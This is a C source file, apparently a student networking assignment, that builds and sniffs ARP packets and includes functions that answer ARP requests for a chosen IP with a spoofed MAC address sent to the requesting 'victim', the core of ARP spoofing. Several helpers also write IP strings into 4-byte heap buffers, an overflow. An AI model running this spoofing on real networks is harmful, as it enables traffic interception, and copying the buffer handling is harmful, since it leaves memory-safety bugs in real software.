#include "arp.h"

#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <linux/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/if_arp.h>  
#include <sys/ioctl.h>


//You can fill the following functions or add other functions if needed. If not, you needn't write anything in them.  
void set_hard_type(struct ether_arp *packet, unsigned short int type){
	packet->arp_hrd = htons(type);//"host to network short" = htons
}
void set_prot_type(struct ether_arp *packet, unsigned short int type){
	packet->arp_pro = htons(type);
}
void set_hard_size(struct ether_arp *packet, unsigned char size){
	packet->arp_hln = size;
}
void set_prot_size(struct ether_arp *packet, unsigned char size){
	packet->arp_pln = size;
}
void set_op_code(struct ether_arp *packet, short int code){
	packet->arp_op = htons(code);
}

void set_sender_hardware_addr(struct ether_arp *packet, char *address){
    for (int i = 0; i < ETH_ALEN; i++) {
        packet->arp_sha[i] = address[i];  
    }
}
void set_sender_protocol_addr(struct ether_arp *packet, char *address){
	if (inet_pton(AF_INET, address, packet->arp_spa) != 1) {
        perror("inet_pton error for sender protocol address");
        exit(1);
    }
}
void set_target_hardware_addr(struct ether_arp *packet, char *address) {
    for (int i = 0; i < ETH_ALEN; i++) {
        packet->arp_tha[i] = address[i];  
    }
}
void set_target_protocol_addr(struct ether_arp *packet, char *address){
	if (inet_pton(AF_INET, address, packet->arp_tpa) != 1) {
        perror("inet_pton error for target protocol address");
        exit(1);
    }
}
// if you use malloc, remember to free it.----------------------------------------------------
char* get_target_protocol_addr(struct ether_arp *packet) {
    char* target_ip = (char*)malloc(4);  // ipv4 4 bytes
    if (target_ip != NULL) {
        for (int i = 0; i < 4; i++) {
            target_ip[i] = packet->arp_tpa[i];
        }
		inet_ntop(AF_INET, packet->arp_tpa, target_ip, INET_ADDRSTRLEN);//"Internet Network to Presentation" = inet_ntop
    }
    return target_ip;  
    free(target_ip);
}
char* get_sender_protocol_addr(struct ether_arp *packet) {
    char* sender_ip = (char*)malloc(4);
    if (sender_ip != NULL) {
        for (int i = 0; i < 4; i++) {
            sender_ip[i] = packet->arp_spa[i];
        }
		inet_ntop(AF_INET, packet->arp_spa, sender_ip, INET_ADDRSTRLEN);
    }
    return sender_ip;
}

char* get_sender_hardware_addr(struct ether_arp *packet) {
    char* sender_mac = (char*)malloc(18);  
    if (sender_mac != NULL) {
        sprintf(sender_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                packet->arp_sha[0] & 0xff,
                packet->arp_sha[1] & 0xff,
                packet->arp_sha[2] & 0xff,
                packet->arp_sha[3] & 0xff,
                packet->arp_sha[4] & 0xff,
                packet->arp_sha[5] & 0xff);
    }
    return sender_mac;  
}



char* get_target_hardware_addr(struct ether_arp *packet) {
    char* target_mac = (char*)malloc(ETH_ALEN);  //
    if (target_mac != NULL) {
        for (int i = 0; i < ETH_ALEN; i++) {
            target_mac[i] = packet->arp_tha[i];
        }
    }
    return target_mac;
}
//--------------------------------------------myfunction

void capture_arp_packets(int sockfd_recv, const char *filter_ip) {//include all and specific ip
    unsigned char buffer[ETH_FRAME_LEN];  // to store data of arp packet
    struct sockaddr_ll src_addr;
    socklen_t addr_len = sizeof(src_addr);

    while (1) {
        // keep receiving packets
        ssize_t numbytes = recvfrom(sockfd_recv, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&src_addr, &addr_len);
        if (numbytes < 0) {
            perror("recvfrom error");
            exit(1);
        }

        // analyze Ethernet header
        struct ether_header *eth_hdr = (struct ether_header *)buffer;

        // check if it's an ARP packet
        if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            struct ether_arp *arp_hdr = (struct ether_arp *)(buffer + sizeof(struct ether_header));

            // use getfunction
            char* sender_ip = get_sender_protocol_addr(arp_hdr);  // Copy sender ip
            char* target_ip = get_target_protocol_addr(arp_hdr);  // Copy target ip

            // If a filter is specified, skip packets that don't match the target ip
            if (filter_ip != NULL && strcmp(filter_ip, target_ip) != 0) {
                free(sender_ip);  //free memory important(I forgot this at begining)
                free(target_ip);  
                continue;
            }

            // Print the ARP message
            printf("Get ARP packet - Who has %s? Tell %s\n", target_ip, sender_ip);

            //free memory
            free(sender_ip);
            free(target_ip);
        }
    }
}

void capture_arp_reply_packets(int sockfd_recv, const char *query_ip) {
    unsigned char buffer[ETH_FRAME_LEN];  
    struct sockaddr_ll src_addr;
    socklen_t addr_len = sizeof(src_addr);

    while (1) {
        
        ssize_t numbytes = recvfrom(sockfd_recv, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&src_addr, &addr_len);
        if (numbytes < 0) {
            perror("recvfrom error");
            exit(1);
        }

        
        struct ether_header *eth_hdr = (struct ether_header *)buffer;

        
        if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            struct ether_arp *arp_hdr = (struct ether_arp *)(buffer + sizeof(struct ether_header));

             
            char sender_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp_hdr->arp_spa, sender_ip, INET_ADDRSTRLEN);

            char sender_mac[18];
            sprintf(sender_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                    arp_hdr->arp_sha[0], arp_hdr->arp_sha[1], arp_hdr->arp_sha[2],
                    arp_hdr->arp_sha[3], arp_hdr->arp_sha[4], arp_hdr->arp_sha[5]);

            
            if (strcmp(sender_ip, query_ip) == 0 && arp_hdr->arp_op == htons(ARPOP_REPLY)) {
                printf("MAC address of %s is %s\n", query_ip, sender_mac);
                
                break;  
            }
        }
    }
}




void send_arp_request(int sockfd_send, const char *target_ip_str, const char *source_ip_str, const char *source_mac_str) {
    struct ether_arp arp_req;
    struct ether_header eth_hdr;
    struct sockaddr_ll sa;

    // Set the destination MAC to broadcast
    memset(eth_hdr.ether_dhost, 0xff, ETH_ALEN);  
    sscanf(source_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &eth_hdr.ether_shost[0], &eth_hdr.ether_shost[1], &eth_hdr.ether_shost[2],
           &eth_hdr.ether_shost[3], &eth_hdr.ether_shost[4], &eth_hdr.ether_shost[5]);
    eth_hdr.ether_type = htons(ETHERTYPE_ARP);  // set ARP type

    // Fill ARP request fields
    set_hard_type(&arp_req, ARPHRD_ETHER);  
    set_prot_type(&arp_req, ETHERTYPE_IP);  
    set_hard_size(&arp_req, ETH_ALEN);  
    set_prot_size(&arp_req, 4);  
    set_op_code(&arp_req, ARPOP_REQUEST);  // set opcode ARP request
    
    
    set_sender_hardware_addr(&arp_req, eth_hdr.ether_shost);

    set_sender_protocol_addr(&arp_req, source_ip_str);

    unsigned char zero_mac[ETH_ALEN] = {0};  
    set_target_hardware_addr(&arp_req, zero_mac);

    set_target_protocol_addr(&arp_req, target_ip_str);

    unsigned char buffer[ETH_FRAME_LEN];
    memcpy(buffer, &eth_hdr, sizeof(struct ether_header));
    memcpy(buffer + sizeof(struct ether_header), &arp_req, sizeof(struct ether_arp));

    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_nametoindex("enp0s3");  
    if (sa.sll_ifindex == 0) {
        perror("if_nametoindex error");
        exit(1);
    }
    sa.sll_halen = ETH_ALEN;

    
    if (sendto(sockfd_send, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    perror("sendto error");
    exit(1);
	}


    printf("ARP request sent to %s\n", target_ip_str);
}


//get local ip and MAC-----------------------------------------------------------------------------
void get_local_ip(const char *device_name, char *ip_str) {
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
    if (sockfd < 0) {
        perror("socket error");
        exit(1);
    }

    strncpy(ifr.ifr_name, device_name, IFNAMSIZ-1);
    ifr.ifr_addr.sa_family = AF_INET;

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {  // get local ip
        perror("ioctl error");
        close(sockfd);
        exit(1);
    }

    struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    inet_ntop(AF_INET, &ip_addr->sin_addr, ip_str, INET_ADDRSTRLEN);

    close(sockfd);
}

void get_local_mac(const char *device_name, char *mac_str) {
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
    if (sockfd < 0) {
        perror("socket error");
        exit(1);
    }

    strncpy(ifr.ifr_name, device_name, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {  // get local MAC
        perror("ioctl error");
        close(sockfd);
        exit(1);
    }

    unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    close(sockfd);
}

//send ARP reply (fake MAC)----------------------------------------------------------
void send_arp_reply(int sockfd_send, const char *target_ip, const char *fake_mac, const char *source_ip, const char *source_mac, const char *victim_mac) {
    struct ether_arp arp_resp;
    struct ether_header eth_hdr;
	struct ether_header eth_hdr2;//
    struct sockaddr_ll sa;

    // set Ethernet header
    sscanf(victim_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
       &eth_hdr.ether_dhost[0], &eth_hdr.ether_dhost[1], &eth_hdr.ether_dhost[2],
       &eth_hdr.ether_dhost[3], &eth_hdr.ether_dhost[4], &eth_hdr.ether_dhost[5]);  // victim's MAC

    
    sscanf(source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
       &eth_hdr.ether_shost[0], &eth_hdr.ether_shost[1], &eth_hdr.ether_shost[2],
       &eth_hdr.ether_shost[3], &eth_hdr.ether_shost[4], &eth_hdr.ether_shost[5]);  // attackter's mac

	sscanf(fake_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
       &eth_hdr2.ether_shost[0], &eth_hdr2.ether_shost[1], &eth_hdr2.ether_shost[2],
       &eth_hdr2.ether_shost[3], &eth_hdr2.ether_shost[4], &eth_hdr2.ether_shost[5]);  // fake mac

    eth_hdr.ether_type = htons(ETHERTYPE_ARP); 

    
    set_hard_type(&arp_resp, ARPHRD_ETHER);
    set_prot_type(&arp_resp, ETHERTYPE_IP);
    set_hard_size(&arp_resp, ETH_ALEN);
    set_prot_size(&arp_resp, 4);
    set_op_code(&arp_resp, ARPOP_REPLY);  // set ARP reply

    // set ARP response sender target 
    // sender_hardware_addr set attackter's mac
    set_sender_hardware_addr(&arp_resp, eth_hdr2.ether_shost);  // this is attackter's mac
    set_sender_protocol_addr(&arp_resp, target_ip);  // this is target ip

    set_target_hardware_addr(&arp_resp, eth_hdr.ether_dhost);  // victim's MAC 
    set_target_protocol_addr(&arp_resp, source_ip);  // victim's ip 

    
    unsigned char buffer[ETH_FRAME_LEN];
    memcpy(buffer, &eth_hdr, sizeof(struct ether_header));
    memcpy(buffer + sizeof(struct ether_header), &arp_resp, sizeof(struct ether_arp));

   
    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_nametoindex("enp0s3");  
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, eth_hdr.ether_dhost, ETH_ALEN);  

    
    if (sendto(sockfd_send, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto error");
        exit(1);
    }

    
    //printf("Send ARP Reply to victim: %s is at %s\n", target_ip, fake_mac); //for debug
}








//capture specific ARP request and reply fake MAC--------------------------------
void capture_and_reply_arp_packets(int sockfd_recv, int sockfd_send, const char *target_ip, const char *fake_mac, const char *source_ip, const char *source_mac) {
    unsigned char buffer[ETH_FRAME_LEN];  // to store data of ARP packet
    struct sockaddr_ll src_addr;
    socklen_t addr_len = sizeof(src_addr);

    while (1) {
        // receive ARP packet
        ssize_t numbytes = recvfrom(sockfd_recv, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&src_addr, &addr_len);
        if (numbytes < 0) {
            perror("recvfrom error");
            exit(1);
        }

        // analyze Ethernet header
        struct ether_header *eth_hdr = (struct ether_header *)buffer;

        // check ARP or other packet
        if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            struct ether_arp *arp_hdr = (struct ether_arp *)(buffer + sizeof(struct ether_header));

            // get sender ip
            char sender_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp_hdr->arp_spa, sender_ip, INET_ADDRSTRLEN);
            
            char sender_mac[18];
            sprintf(sender_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                    arp_hdr->arp_sha[0], arp_hdr->arp_sha[1], arp_hdr->arp_sha[2],
                    arp_hdr->arp_sha[3], arp_hdr->arp_sha[4], arp_hdr->arp_sha[5]);

            // get target ip
            char target_ip_in_packet[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp_hdr->arp_tpa, target_ip_in_packet, INET_ADDRSTRLEN);
			
            //printf("ARP request from %s (%s) for IP: %s\n", sender_mac, sender_ip, target_ip_in_packet);
			
            // if target ip match
            if (strcmp(target_ip_in_packet, target_ip) == 0) {
                // send ARP request
				char *victim_mac = get_sender_hardware_addr(arp_hdr); // 提取請求者的MAC地址
				printf("Sent ARP Reply : %s is: %s\n", target_ip, fake_mac);
                send_arp_reply(sockfd_send, target_ip, fake_mac, sender_ip, source_mac, victim_mac);
                printf("Sent Successful.\n");
                free(victim_mac);
				break;
            }
        }
    }
}
